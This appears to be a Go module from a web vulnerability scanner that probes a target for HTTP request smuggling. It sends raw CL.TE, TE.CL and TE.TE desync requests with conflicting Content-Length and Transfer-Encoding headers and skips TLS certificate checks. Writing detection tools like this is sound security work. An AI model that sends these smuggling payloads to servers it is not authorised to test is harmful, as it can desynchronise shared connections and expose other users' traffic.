package modules

import (
	"crypto/rand"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"github.com/SentinelXofficial/sxel/internal/output"
	"github.com/SentinelXofficial/sxel/pkg/core"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"
)

func ScanSmuggling(client *http.Client, cfg *core.Config, target core.CrawlResult) []core.ScanResult {
	var results []core.ScanResult

	parsed, err := url.Parse(target.URL)
	if err != nil {
		return nil
	}

	host := parsed.Host
	if !strings.Contains(host, ":") {
		if parsed.Scheme == "https" {
			host += ":443"
		} else {
			host += ":80"
		}
	}

	output.Info("[smuggling] probing %s (%s)\n", target.URL, host)

	if res := testCLTE(client, cfg, host, target.URL, parsed); res != nil {
		results = append(results, *res)
	}

	if res := testTECL(client, cfg, host, target.URL, parsed); res != nil {
		results = append(results, *res)
	}

	if res := testTETE(client, cfg, host, target.URL, parsed); res != nil {
		results = append(results, *res)
	}

	return results
}

func smuggledDial(host string, tlsConfig *tls.Config, timeout time.Duration) (net.Conn, error) {
	dialer := net.Dialer{Timeout: timeout}
	if tlsConfig != nil {
		conn, err := tls.DialWithDialer(&dialer, "tcp", host, tlsConfig)
		return conn, err
	}
	return dialer.Dial("tcp", host)
}

func smuggledRequest(host, targetURL string, tlsConfig *tls.Config, rawBytes []byte, timeout time.Duration) (string, error) {
	conn, err := smuggledDial(host, tlsConfig, timeout)
	if err != nil {
		return "", err
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(timeout))
	if _, err := conn.Write(rawBytes); err != nil {
		return "", err
	}

	var resp bytesBuf
	buf := make([]byte, 4096)
	for {
		n, err := conn.Read(buf)
		if n > 0 {
			resp.Write(buf[:n])
		}
		if err != nil {
			break
		}
	}
	return resp.String(), nil
}

type bytesBuf struct {
	bytes []byte
}

func (b *bytesBuf) Write(p []byte) (int, error) {
	b.bytes = append(b.bytes, p...)
	return len(p), nil
}

func (b *bytesBuf) String() string {
	return string(b.bytes)
}

func testCLTE(client *http.Client, cfg *core.Config, host, targetURL string, parsed *url.URL) *core.ScanResult {
	marker := smugMarkerPath()

	smuggled := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\n\r\n", marker, parsed.Host)
	body := "0\r\n\r\n" + smuggled

	req1 := fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nTransfer-Encoding: chunked\r\n\r\n%s",
		parsed.RequestURI(), parsed.Host, cfg.UserAgent, len(body), body)

	req2 := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n",
		parsed.Host, cfg.UserAgent)

	tlsCfg := &tls.Config{InsecureSkipVerify: true}
	if parsed.Scheme != "https" {
		tlsCfg = nil
	}

	resp1, err := smuggledRequest(host, targetURL, tlsCfg, []byte(req1+req2), 10*time.Second)
	if err != nil {
		if cfg.Verbose {
			output.Verbose("[smuggling] CL.TE probe failed: %v", err)
		}
		return nil
	}

	if strings.Contains(resp1, marker) {
		return &core.ScanResult{
			Type:      "HTTP Request Smuggling — CL.TE Desync",
			URL:       targetURL,
			Method:    "POST (raw TCP)",
			Parameter: "Transfer-Encoding / Content-Length",
			Payload:   "CL.TE: CL=" + fmt.Sprintf("%d", len(body)) + " TE=chunked (" + marker + ")",
			Severity:  "CRITICAL",
			Evidence:  "Server processed the smuggled request " + marker + " — the desynchronised request was reflected in the response",
			Timestamp: time.Now(),
		}
	}
	return nil
}

func responseCount(raw string) int {
	return strings.Count(raw, "HTTP/1.1 ") + strings.Count(raw, "HTTP/1.0 ")
}

func testTECL(client *http.Client, cfg *core.Config, host, targetURL string, parsed *url.URL) *core.ScanResult {
	marker := smugMarkerPath()

	smuggled := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\n\r\n", marker, parsed.Host)

	chunkLine := fmt.Sprintf("%x\r\n", len(smuggled))
	body := chunkLine + smuggled + "\r\n0\r\n\r\n"

	req1 := fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nContent-Length: %d\r\n\r\n%s",
		parsed.RequestURI(), parsed.Host, cfg.UserAgent, len(chunkLine), body)

	req2 := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n",
		parsed.Host, cfg.UserAgent)

	tlsCfg := &tls.Config{InsecureSkipVerify: true}
	if parsed.Scheme != "https" {
		tlsCfg = nil
	}

	resp1, err := smuggledRequest(host, targetURL, tlsCfg, []byte(req1+req2), 10*time.Second)
	if err != nil {
		if cfg.Verbose {
			output.Verbose("[smuggling] TE.CL probe failed: %v", err)
		}
		return nil
	}

	if strings.Contains(resp1, marker) {
		return &core.ScanResult{
			Type:      "HTTP Request Smuggling — TE.CL Desync",
			URL:       targetURL,
			Method:    "POST (raw TCP)",
			Parameter: "Transfer-Encoding / Content-Length",
			Payload:   "TE.CL: TE=chunked CL=" + fmt.Sprintf("%d", len(chunkLine)) + " (" + marker + ")",
			Severity:  "CRITICAL",
			Evidence:  "Server processed the smuggled request " + marker + " — the desynchronised request was reflected in the response",
			Timestamp: time.Now(),
		}
	}
	return nil
}

func smugMarkerPath() string {
	b := make([]byte, 6)
	if _, err := rand.Read(b); err == nil {
		return "/sxel-smug-" + hex.EncodeToString(b)
	}
	return fmt.Sprintf("/sxel-smug-%d", time.Now().UnixNano()%999999)
}

func testTETE(client *http.Client, cfg *core.Config, host, targetURL string, parsed *url.URL) *core.ScanResult {
	smuggleBody := "0\r\n\r\n"

	raw := fmt.Sprintf("POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: identity\r\nConnection: close\r\n\r\n%sGET /404 HTTP/1.1\r\nX-Smuggled: sxel\r\n\r\n",
		parsed.RequestURI(), parsed.Host, cfg.UserAgent, smuggleBody)

	tlsCfg := &tls.Config{InsecureSkipVerify: true}
	if parsed.Scheme != "https" {
		tlsCfg = nil
	}

	deadline := time.Duration(cfg.Timeout) * time.Second
	if cfg.HandshakeTimeout > 0 {
		deadline = time.Duration(cfg.HandshakeTimeout) * time.Second
	}
	if deadline <= 0 {
		deadline = 10 * time.Second
	}
	resp1, err := smuggledRequest(host, targetURL, tlsCfg, []byte(raw), deadline)
	if err != nil {
		return nil
	}

	if responseCount(resp1) >= 2 || strings.Contains(resp1, "X-Smuggled") {
		return &core.ScanResult{
			Type:      "HTTP Request Smuggling — TE.TE Confusion",
			URL:       targetURL,
			Method:    "POST (raw TCP)",
			Parameter: "Transfer-Encoding (obfuscation)",
			Payload:   "TE.TE: chunked + identity obfuscation",
			Severity:  "CRITICAL",
			Evidence: fmt.Sprintf("Server processed the obfuscated TE sequence — %d responses for 1 request; a TE.TE desynchronisation is possible when front-end and back-end select different transfer codings",
				responseCount(resp1)),
			Timestamp: time.Now(),
		}
	}
	return nil
}
